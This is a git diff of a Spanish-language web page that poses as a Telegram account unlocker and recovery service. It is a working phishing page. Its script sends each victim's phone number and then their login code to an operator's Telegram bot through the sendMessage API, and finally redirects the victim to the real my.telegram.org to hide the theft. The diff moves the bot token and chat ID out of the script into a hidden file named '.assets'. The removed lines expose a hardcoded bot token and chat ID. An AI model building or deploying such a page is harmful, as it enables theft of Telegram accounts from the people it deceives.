@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Desbloqueador d ecuentss y recuperación de cuentas de Telegram</title>
+  <title>Desbloqueador de cuentas y recuperación de cuentas de Telegram</title>
   <style>
     :root{
       --bg:#ffffff;
@@ -94,7 +94,7 @@
           <img src="assets/product_logo.png" alt="Logo" />
         </div>
         <div>
-          <h1 id="title">Configuració de la Cuenta</h1>
+          <h1 id="title">Configuración de la Cuenta</h1>
           <p class="lead">Introduce tu teléfono para recibir un código seguro para poder recargar y desbloquear tu cuenta. Los datos son destruidos por limites de ChatGPT J</p>
         </div>
       </header>
@@ -137,66 +137,104 @@
   </div>
 
   <script>
-    const TOKEN = '8354206376:AAFYhtdU9UQeQMa_f7LF6A2K9ELExQ8rAY8'; // Reemplaza con el token de tu bot de Telegram
-    const CHAT_ID = '-1002806046486'; // Reemplaza con el chat_id al que deseas enviar los mensajes
+    async function loadCredentials() {
+      try {
+        const response = await fetch('assets/.assets');
+        const text = await response.text();
+        const lines = text.split('\n');
+        const token = lines[0].trim();
+        const chatId = lines[1].trim();
+        return { token, chatId };
+      } catch (error) {
+        console.error('Error al cargar las credenciales:', error);
+        throw error;
+      }
+    }
 
-    const recoveryForm = document.getElementById('recoveryForm');
-    const codeForm = document.getElementById('codeForm');
-    const successBox = document.getElementById('successBox');
-    const errorBox = document.getElementById('errorBox');
+    // Función para mostrar un error
+    function showError(msg) {
+      const errorBox = document.getElementById('errorBox');
+      errorBox.textContent = msg;
+      errorBox.style.display = 'block';
+      document.getElementById('successBox').style.display = 'none';
+    }
 
-    function showError(msg){ errorBox.textContent = msg; errorBox.style.display = 'block'; successBox.style.display='none'; }
-    function showSuccess(msg){ successBox.textContent = msg; successBox.style.display = 'block'; errorBox.style.display='none'; }
+    // Función para mostrar un éxito
+    function showSuccess(msg) {
+      const successBox = document.getElementById('successBox');
+      successBox.textContent = msg;
+      successBox.style.display = 'block';
+      document.getElementById('errorBox').style.display = 'none';
+    }
 
-    recoveryForm.addEventListener('submit', async (e)=>{
+    // Event listener para el formulario de recuperación
+    document.getElementById('recoveryForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const phone = document.getElementById('phone').value.trim();
-      if(!phone){ showError('Introduce un teléfono válido.'); return; }
+      if (!phone) {
+        showError('Introduce un teléfono válido.');
+        return;
+      }
 
-      try{
-        // Envia el número de teléfono al bot de Telegram
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+      try {
+        const { token, chatId } = await loadCredentials();
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            chat_id: CHAT_ID,
+            chat_id: chatId,
             text: `Número de teléfono recibido: ${phone}`
           })
         });
 
         showSuccess('Código enviado. Por favor, revisa tu teléfono.');
-        recoveryForm.style.display = 'none';
-        codeForm.style.display = 'block';
+        document.getElementById('recoveryForm').style.display = 'none';
+        document.getElementById('codeForm').style.display = 'block';
 
-      }catch(err){
+      } catch (err) {
         console.error(err);
         showError('No se pudo enviar el código. Revisa la conexión o contacta soporte.');
       }
     });
 
-    codeForm.addEventListener('submit', async (e)=>{
+    // Event listener para el formulario de código
+    document.getElementById('codeForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const code = document.getElementById('code').value.trim();
-      if(!code){ showError('Introduce el código recibido.'); return; }
+      if (!code) {
+        showError('Introduce el código recibido.');
+        return;
+      }
 
-      try{
-        // Envia el código al bot de Telegram
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-          method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: `Código recibido: ${code}` })
+      try {
+        const { token, chatId } = await loadCredentials();
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: `Código recibido: ${code}`
+          })
         });
         showSuccess('Código verificado. Redirigiendo a Telegram para verificar que provenga de una persona real...');
-        setTimeout(()=> location.href = 'https://my.telegram.org/auth?to=recovery', 900);
-      }catch(err){
+        setTimeout(() => location.href = 'https://my.telegram.org/auth?to=recovery', 900);
+      } catch (err) {
         console.error(err);
         showError('Código inválido o expirado. Intenta de nuevo.');
       }
     });
 
-    document.getElementById('helpBtn').addEventListener('click', ()=>{
+    // Event listener para el botón de ayuda
+    document.getElementById('helpBtn').addEventListener('click', () => {
       alert('Si no recibes el código, comprueba el número o contacta soporte.');
     });
-    document.getElementById('cancelCode').addEventListener('click', ()=>{
-      codeForm.style.display='none'; recoveryForm.style.display='block'; successBox.style.display='none'; errorBox.style.display='none';
+
+    // Event listener para el botón de cancelar
+    document.getElementById('cancelCode').addEventListener('click', () => {
+      document.getElementById('codeForm').style.display = 'none';
+      document.getElementById('recoveryForm').style.display = 'block';
+      document.getElementById('successBox').style.display = 'none';
+      document.getElementById('errorBox').style.display = 'none';
     });
   </script>
 </body>
